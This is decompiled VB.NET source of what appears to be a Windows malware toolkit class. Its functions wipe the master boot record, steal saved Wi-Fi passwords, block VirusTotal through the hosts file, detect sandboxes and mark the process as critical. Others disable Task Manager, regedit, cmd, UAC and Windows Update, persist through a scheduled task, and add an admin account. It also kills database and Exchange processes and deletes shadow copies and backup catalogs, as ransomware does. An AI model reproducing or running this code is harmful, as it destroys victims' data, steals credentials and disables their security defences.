Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.ServiceProcess
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Main.Properties
Imports Microsoft.Win32

Namespace Main.Tools
	' Token: 0x0200002C RID: 44
	Public Class UtilitiesProcess
		' Token: 0x060000EB RID: 235 RVA: 0x000097AC File Offset: 0x000079AC
		Public Shared Sub ProtectDirectory(directory As String, token As String)
			Try
				If Not File.Exists(directory) AndAlso Not Directory.Exists(directory) Then
					Throw New DirectoryNotFoundException(directory)
				End If
				Using process As Process = New Process()
					process.StartInfo.FileName = "icacls"
					process.StartInfo.Arguments = String.Format("""{0}"" /deny ""{1}"":({2})", directory, Environment.UserName, token)
					process.StartInfo.CreateNoWindow = True
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
					process.StartInfo.UseShellExecute = False
					process.StartInfo.Verb = "runas"
					process.Start()
					process.WaitForExit()
				End Using
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000EC RID: 236 RVA: 0x00009878 File Offset: 0x00007A78
		Public Shared Sub RandomDomainGenerator(Optional visitsPerMinute As Integer = 3)
			While True
				Dim array As String() = New String() { ".org", ".com", ".net", ".edu", ".gov", ".us", ".ru", ".de", ".nz", ".onion", ".info" }
				Dim random As Random = New Random()
				Dim text As String = UtilitiesProcess.GenerateCoupon(random.[Next](5, 40))
				Dim text2 As String = text + array(random.[Next](0, array.Length))
				VisitWebSite.DoVisitWebSite("http://www." + text2)
				Thread.Sleep(visitsPerMinute * 60 * 1000)
			End While
		End Sub

		' Token: 0x060000ED RID: 237 RVA: 0x00009934 File Offset: 0x00007B34
		Public Shared Function GenerateCoupon(length As Integer) As String
			Dim random As Random = New Random()
			Dim text As String = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
			Dim stringBuilder As StringBuilder = New StringBuilder(length)
			For i As Integer = 0 To length - 1
				stringBuilder.Append(text(random.[Next](text.Length)))
			Next
			Return stringBuilder.ToString()
		End Function

		' Token: 0x060000EE RID: 238 RVA: 0x00009988 File Offset: 0x00007B88
		Public Shared Function IsInVirusTotalVm() As Boolean
			Return Process.GetCurrentProcess().ProcessName = "mlwr_smpl" OrElse Environment.MachineName.StartsWith("placehol-")
		End Function

		' Token: 0x060000EF RID: 239 RVA: 0x000099C0 File Offset: 0x00007BC0
		Public Shared Sub BlockVirusTotal()
			Try
				Dim text As String = "C:\Windows\System32\Drivers\Etc\Hosts"
				If File.Exists(text) AndAlso Not File.ReadAllText(text).Contains("virustotal") Then
					Dim text2 As String = String.Concat(New String() { "127.0.0.1    https://www.virustotal.com", Environment.NewLine, "127.0.0.1    http://www.virustotal.com", Environment.NewLine, "127.0.0.1    www.virustotal.com", Environment.NewLine, "127.0.0.1    https://virusscan.jotti.org", Environment.NewLine, "127.0.0.1    virusscan.jotti.org", Environment.NewLine, "127.0.0.1    www.virusscan.jotti.org" })
					File.AppendAllText(text, text2)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000F0 RID: 240 RVA: 0x00009A78 File Offset: 0x00007C78
		Public Shared Function GetIpAddress() As String
			Dim text As String = ""
			Try
				text = New WebClient().DownloadString("http://icanhazip.com")
				text = text.Replace(vbLf, "")
			Catch
			End Try
			Return text
		End Function

		' Token: 0x060000F1 RID: 241 RVA: 0x00009AC4 File Offset: 0x00007CC4
		Public Shared Function WifiInfos() As String
			Dim text As String = ""
			Try
				Dim text2 As String = "/C netsh wlan show profiles"
				Dim process As Process = New Process() With { .StartInfo = { .FileName = "cmd.exe", .Arguments = text2, .UseShellExecute = False, .CreateNoWindow = True, .RedirectStandardOutput = True, .WindowStyle = ProcessWindowStyle.Hidden, .StandardOutputEncoding = Encoding.GetEncoding(850) } }
				process.Start()
				Dim enumerable As IEnumerable(Of String) = process.StandardOutput.ReadToEnd().Split(New Char() { vbLf })
				Dim <>9__16_ As Func(Of String, Boolean) = UtilitiesProcess.<>c.<>9__16_0
				Dim func As Func(Of String, Boolean) = <>9__16_
				If <>9__16_ Is Nothing Then
					Dim func2 As Func(Of String, Boolean) = Function(x As String) x.Contains(":"c) AndAlso x.Length > 5
					func = func2
					UtilitiesProcess.<>c.<>9__16_0 = func2
				End If
				Dim enumerable2 As IEnumerable(Of String) = enumerable.Where(func).Skip(1)
				Dim <>9__16_2 As Func(Of String, String) = UtilitiesProcess.<>c.<>9__16_1
				Dim func3 As Func(Of String, String) = <>9__16_2
				If <>9__16_2 Is Nothing Then
					Dim func4 As Func(Of String, String) = Function(x As String) x.Substring(x.LastIndexOf(":"c) + 2, x.Length - x.LastIndexOf(":"c) - 3)
					func3 = func4
					UtilitiesProcess.<>c.<>9__16_1 = func4
				End If
				Dim list As List(Of String) = enumerable2.[Select](func3).ToList()
				process.WaitForExit()
				For Each text3 As String In list
					process.StartInfo.Arguments = "/C netsh wlan show profile """ + text3 + """ key=clear"
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
					process.Start()
					text += process.StandardOutput.ReadToEnd()
				Next
				text += "{end}"
			Catch
			End Try
			Return text
		End Function

		' Token: 0x060000F2 RID: 242 RVA: 0x00009C78 File Offset: 0x00007E78
		Public Shared Sub DisableWindowsUpdate(enable As Boolean)
			Try
				Dim serviceController As ServiceController = New ServiceController("wuauserv")
				If serviceController IsNot Nothing AndAlso serviceController.Status = ServiceControllerStatus.Running AndAlso enable Then
					serviceController.[Stop]()
					serviceController.WaitForStatus(ServiceControllerStatus.Stopped)
				ElseIf serviceController IsNot Nothing AndAlso serviceController.Status = ServiceControllerStatus.Stopped AndAlso Not enable Then
					serviceController.Start()
					serviceController.WaitForStatus(ServiceControllerStatus.Running)
				End If
				serviceController.Close()
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000F3 RID: 243 RVA: 0x00009CF0 File Offset: 0x00007EF0
		Public Shared Sub Registration()
			Try
				Dim registration As Byte() = Resources.registration
				Using fileStream As FileStream = New FileStream(Path.GetDirectoryName(Application.ExecutablePath) + "\registration.rar", FileMode.OpenOrCreate)
					fileStream.Write(registration, 0, registration.Length)
					File.SetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\registration.rar", File.GetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\registration.rar") Or FileAttributes.Hidden Or FileAttributes.System)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x060000F4 RID: 244 RVA: 0x00009D90 File Offset: 0x00007F90
		Public Shared Sub Dll()
			Try
				Dim newtonsoft_Json As Byte() = Resources.Newtonsoft_Json
				Using fileStream As FileStream = New FileStream(Path.GetDirectoryName(Application.ExecutablePath) + "\Newtonsoft.Json.dll", FileMode.OpenOrCreate)
					fileStream.Write(newtonsoft_Json, 0, newtonsoft_Json.Length)
					File.SetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\Newtonsoft.Json.dll", File.GetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\Newtonsoft.Json.dll") Or FileAttributes.Hidden Or FileAttributes.System)
				End Using
			Catch
			End Try
			Try
				Dim skinSoft_VisualStyler As Byte() = Resources.SkinSoft_VisualStyler
				Dim text As String = "\SkinSoft.VisualStyler.dll"
				Using fileStream2 As FileStream = New FileStream(Path.GetDirectoryName(Application.ExecutablePath) + text, FileMode.OpenOrCreate)
					fileStream2.Write(skinSoft_VisualStyler, 0, skinSoft_VisualStyler.Length)
					File.SetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + text, File.GetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + text) Or FileAttributes.Hidden Or FileAttributes.System)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x060000F5 RID: 245
		Private Declare Function CreateFile Lib "kernel32" (lpFileName As String, dwDesiredAccess As UInteger, dwShareMode As UInteger, lpSecurityAttributes As IntPtr, dwCreationDisposition As UInteger, dwFlagsAndAttributes As UInteger, hTemplateFile As IntPtr) As IntPtr

		' Token: 0x060000F6 RID: 246
		Private Declare Function WriteFile Lib "kernel32" (hFile As IntPtr, lpBuffer As Byte(), nNumberOfBytesToWrite As UInteger, <System.Runtime.InteropServices.OutAttribute()> ByRef lpNumberOfBytesWritten As UInteger, lpOverlapped As IntPtr) As Boolean

		' Token: 0x060000F7 RID: 247 RVA: 0x00009EB8 File Offset: 0x000080B8
		Public Shared Sub EraseMbr(Optional driveName As String = "")
			Dim array As Byte() = New Byte(511) {}
			Dim intPtr As IntPtr = UtilitiesProcess.CreateFile(driveName, 268435456UI, 3UI, IntPtr.Zero, 3UI, 0UI, IntPtr.Zero)
			Dim num As UInteger
			If intPtr = CType((-1), IntPtr) OrElse Not UtilitiesProcess.WriteFile(intPtr, array, 512UI, num, IntPtr.Zero) Then
			End If
		End Sub

		' Token: 0x060000F8 RID: 248
		Private Declare Function NtSetInformationProcess Lib "ntdll.dll" (hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer

		' Token: 0x060000F9 RID: 249 RVA: 0x00009F0C File Offset: 0x0000810C
		Public Shared Sub ProcessIsCritical(Optional critical As Boolean = True)
			Try
				If critical Then
					UtilitiesProcess.IsCritical = 1
				Else
					UtilitiesProcess.IsCritical = 0
				End If
				Process.EnterDebugMode()
				UtilitiesProcess.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, UtilitiesProcess.IsCritical, 4)
			Catch
			End Try
		End Sub

		' Token: 0x060000FA RID: 250 RVA: 0x00009F60 File Offset: 0x00008160
		Public Shared Sub SetTaskManager(enable As Boolean)
			Try
				Dim registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
				If enable AndAlso registryKey.GetValue("DisableTaskMgr") IsNot Nothing Then
					registryKey.DeleteValue("DisableTaskMgr")
				Else
					registryKey.SetValue("DisableTaskMgr", "1")
				End If
				registryKey.Close()
			Catch
			End Try
		End Sub

		' Token: 0x060000FB RID: 251 RVA: 0x00009FCC File Offset: 0x000081CC
		Public Shared Sub taskSchedulerPersistence()
			Try
				Dim mainModule As ProcessModule = Process.GetCurrentProcess().MainModule
				If mainModule IsNot Nothing Then
					New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = mainModule.FileName, .Arguments = "/create /tn ""WINDOWSSYSTEMHOST"" /tr /sc MINUTE /MO 1" } }.Start()
				End If
			Catch
			End Try
		End Sub

		' Token: 0x060000FC RID: 252 RVA: 0x0000A034 File Offset: 0x00008234
		Public Shared Sub deleteService(Optional serviceName As String = "wuaserv")
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "sc.exe", .Arguments = "delete " + serviceName } }.Start()
			Catch
			End Try
		End Sub

		' Token: 0x060000FD RID: 253 RVA: 0x0000A090 File Offset: 0x00008290
		Public Sub disableUAC(Optional disable As Boolean = True)
			Try
				Dim text As String = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
				If disable Then
					Registry.SetValue(text, "EnableLUA", 0)
				Else
					Registry.SetValue(text, "EnableLUA", 1)
				End If
			Catch
			End Try
		End Sub

		' Token: 0x060000FE RID: 254 RVA: 0x0000A0E0 File Offset: 0x000082E0
		Public Shared Sub disableCMD()
			Try
				Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", RegistryValueKind.DWord)
			Catch
			End Try
		End Sub

		' Token: 0x060000FF RID: 255 RVA: 0x0000A118 File Offset: 0x00008318
		Public Shared Sub enableCMD()
			Try
				Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", RegistryValueKind.DWord)
			Catch
			End Try
		End Sub

		' Token: 0x06000100 RID: 256 RVA: 0x0000A150 File Offset: 0x00008350
		Public Shared Sub disableRegedit()
			Try
				Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", RegistryValueKind.DWord)
			Catch
			End Try
		End Sub

		' Token: 0x06000101 RID: 257 RVA: 0x0000A188 File Offset: 0x00008388
		Public Shared Sub enableRegedit()
			Try
				Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", RegistryValueKind.DWord)
			Catch
			End Try
		End Sub

		' Token: 0x06000102 RID: 258 RVA: 0x0000A1C0 File Offset: 0x000083C0
		Public Shared Sub ChangeFileAccessPermissions()
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "cmd.exe", .Arguments = String.Concat(New String() { "/c net user ", Config.AdminUsername, " ", Config.AdminPassword, " /ADD" }) } }.Start()
			Catch
			End Try
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "taskkill.exe", .Arguments = "/f /im mysqld.exe" } }.Start()
			Catch
			End Try
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "taskkill.exe", .Arguments = "/f /im sqlwriter.exe" } }.Start()
			Catch
			End Try
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "taskkill.exe", .Arguments = "/f /im sqlserver.exe" } }.Start()
			Catch
			End Try
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "taskkill.exe", .Arguments = "/f /im MSExchange*" } }.Start()
			Catch
			End Try
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "taskkill.exe", .Arguments = "/f /im Microsoft.Exchange.*" } }.Start()
			Catch
			End Try
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "cmd.exe", .Arguments = "/c vssadmin delete shadow /all /quiet & wmic shadowcopy delete & bcdedit / set { default } boostatuspolicy ignoreallfailures & bcdedit / set { default } recoveryenabled no & wbadmin delete catalog - quiet" } }.Start()
			Catch
			End Try
			Try
				New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "icacls.exe", .Arguments = ". /grant Everyone:F /T /C /Q" } }.Start()
			Catch
			End Try
			If(Directory.Exists(Config.TempExePath) OrElse Directory.Exists(Config.FinalExePath)) AndAlso FormGame.IsElevated() Then
				UtilitiesProcess.ProtectDirectory(Config.TempExePath, "f,d")
				UtilitiesProcess.ProtectDirectory(Config.FinalExePath, "f,d")
			End If
		End Sub

		' Token: 0x040000C9 RID: 201
		Private Const GenericRead As UInteger = 2147483648UI

		' Token: 0x040000CA RID: 202
		Private Const GenericWrite As UInteger = 1073741824UI

		' Token: 0x040000CB RID: 203
		Private Const GenericExecute As UInteger = 536870912UI

		' Token: 0x040000CC RID: 204
		Private Const GenericAll As UInteger = 268435456UI

		' Token: 0x040000CD RID: 205
		Private Const FileShareRead As UInteger = 1UI

		' Token: 0x040000CE RID: 206
		Private Const FileShareWrite As UInteger = 2UI

		' Token: 0x040000CF RID: 207
		Private Const OpenExisting As UInteger = 3UI

		' Token: 0x040000D0 RID: 208
		Private Const FileFlagDeleteOnClose As UInteger = 67108864UI

		' Token: 0x040000D1 RID: 209
		Private Const MbrSize As UInteger = 512UI

		' Token: 0x040000D2 RID: 210
		Public Shared IsCritical As Integer = 1
	End Class
End Namespace
